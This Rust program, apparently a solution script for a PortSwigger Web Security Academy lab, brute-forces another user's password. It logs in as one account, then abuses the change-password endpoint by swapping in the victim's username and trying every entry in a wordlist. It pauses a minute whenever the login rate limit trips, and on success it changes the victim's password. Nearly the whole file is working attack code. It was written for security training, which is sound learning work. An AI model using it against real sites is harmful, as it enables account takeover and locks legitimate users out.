/***************************************************************
*
* Author: Ahmed Elqalawii
*
* Date: 29/8/2023
*
* PortSwigger LAB: Password brute-force via password change
*
* Steps: 1. Login with correct creds
*        2. Change username when requesting change password API
*        3. Repeat the process trying every password
*
****************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use rayon::prelude::*;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
    Error,
};
use std::{
    collections::HashMap,
    error,
    fmt::format,
    fs,
    io::{self, Write},
    process, thread,
    time::{self, Duration, Instant},
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    let url = "https://0a2b007c03db344bcf9c841200a20099.web-security-academy.net"; // change this to the url of your lab
    let client = build_client(); // This client will be used in every request
    let passwords = fs::read_to_string("/home/ahmed/passwords").unwrap(); // read all password in one string

    let start_time = time::Instant::now(); // capture the time before brute forcing
    println!(
        "{} {}..",
        "[#] Brute forcing password of".white().bold(),
        "carlos".green().bold()
    );
    let passwords_count = passwords.lines().count();
    for (index, password) in passwords.lines().enumerate() {
        if let Ok(login_res) = login(&client, &format!("{url}/login"), "wiener", "peter") {
            // try to make a successful login first
            match login_res.status().as_u16() {
                302 => {
                    // login succeeded
                    let session = extract_session_cookie(login_res); // get the valid session
                    let change_password = change_password(
                        // try to guess the current password based on change password functionality
                        &client,
                        &format!("{url}/my-account/change-password"),
                        &session,
                        "carlos",
                        password,
                        "Hola Hola", // chagne the current password to this one
                    );
                    if let Ok(change_password_res) = change_password {
                        if change_password_res.status().as_u16() == 200 {
                            // change password request succeeded
                            println!(
                                "\n[#] {} => {}",
                                password.blue().bold(),
                                "Correct".green().bold()
                            );
                            println!(
                                "[#] {}: {}",
                                "Password changed to".white().bold(),
                                "Hola Hola".green().bold()
                            );
                            break;
                        } else {
                            // change password request failed
                            print!(
                                "\r[*] ({}/{}) {:10} => {}",
                                index,
                                passwords_count,
                                password.blue().bold(),
                                "Incorrect".red().bold()
                            );
                            io::stdout().flush();
                        }
                    } else {
                        println!(
                            "\n{}",
                            "[!] Failed to send change-password request".red().bold()
                        )
                    }
                }
                _ => {
                    // login failed due to multiple requests; wait 1 minute and continue
                    println!("[!] {}", "Waiting 1 minute".yellow().bold());
                    thread::sleep(Duration::from_secs(60))
                }
            }
        } else {
            // login faild for unknown reason
            println!(
                "[*] {} => {}",
                password.white().bold(),
                "LOGIN FAILED".red()
            );
        }
    }
    print_finish_message(start_time);
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(time::Duration::from_secs(60))
        .build()
        .unwrap()
}

/********************************************
* Function used to login with correct creds
*********************************************/
fn login(client: &Client, url: &str, username: &str, password: &str) -> Result<Response, Error> {
    client
        .post(format!("{url}"))
        .form(&HashMap::from([
            ("username", username),
            ("password", password),
        ]))
        .send()
}

/*****************************************************
* Function used to extract session from cookie header
******************************************************/
fn extract_session_cookie(res: Response) -> String {
    let re = regex::Regex::new("session=(.*); Secure").unwrap();
    let cookie_header = res.headers().get("set-cookie").unwrap().to_str().unwrap();
    re.captures(cookie_header)
        .unwrap()
        .get(1)
        .unwrap()
        .as_str()
        .to_string()
}

/**********************************************
* Function used to request change-password API
***********************************************/
fn change_password(
    client: &Client,
    url: &str,
    session: &str,
    username: &str,
    current_password: &str,
    new_password: &str,
) -> Result<Response, Error> {
    client
        .post(url)
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("username", username),
            ("current-password", current_password),
            ("new-password-1", new_password),
            ("new-password-2", new_password),
        ]))
        .send()
}

/****************************************************
* Function used to to print finish time
*****************************************************/
#[inline(always)]
fn print_finish_message(start_time: Instant) {
    println!(
        "\n{}: {:?} minutes",
        "✅ Finished in".green().bold(),
        start_time.elapsed().as_secs() / 60
    );
}
